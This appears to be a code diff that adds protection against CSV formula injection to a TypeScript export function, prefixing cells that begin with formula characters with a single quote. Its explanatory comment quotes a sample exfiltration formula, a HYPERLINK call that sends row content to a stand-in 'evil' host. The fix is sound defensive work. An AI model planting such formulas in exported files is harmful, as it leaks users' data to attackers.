@@ -19,10 +19,19 @@ type Row = {
   notes: string | null;
 };
 
+// CSV "formula injection" (CWE-1236): a cell that starts with `=`, `+`, `-`,
+// `@`, TAB or CR is interpreted as a formula by Excel/LibreOffice when the
+// file is opened. A note like `=HYPERLINK("http://evil/?x="&A1,"click")`
+// would exfiltrate the row content the first time someone opens the export.
+// Prefixing such cells with a single-quote forces the spreadsheet to treat
+// them as literal text (the quote is consumed during display).
+const FORMULA_CHARS = /^[=+\-@\t\r]/;
+
 function escape(v: string | null): string {
   if (v == null) return '';
-  if (/[";\r\n]/.test(v)) return `"${v.replace(/"/g, '""')}"`;
-  return v;
+  const safe = FORMULA_CHARS.test(v) ? `'${v}` : v;
+  if (/[";\r\n]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
+  return safe;
 }
 
 function napCount(r: Row): number {
